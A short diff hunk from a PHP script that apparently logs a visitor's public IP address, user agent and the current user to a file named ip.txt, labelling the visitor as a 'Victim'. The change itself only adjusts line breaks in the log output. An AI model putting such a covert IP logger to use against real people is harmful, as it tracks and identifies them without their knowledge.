@@ -19,9 +19,9 @@ $useragent = "User-Agent: " . $browser;
 $user = get_current_user(); 
 
 $file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
-$victim = "Victim Public IP: " . $ipaddress;
+$victim = "\r\n"."Victim Public IP: " . $ipaddress;
 
-$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user;
+$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user ."\r\n";
 
 $fp = fopen($file, 'a');
 
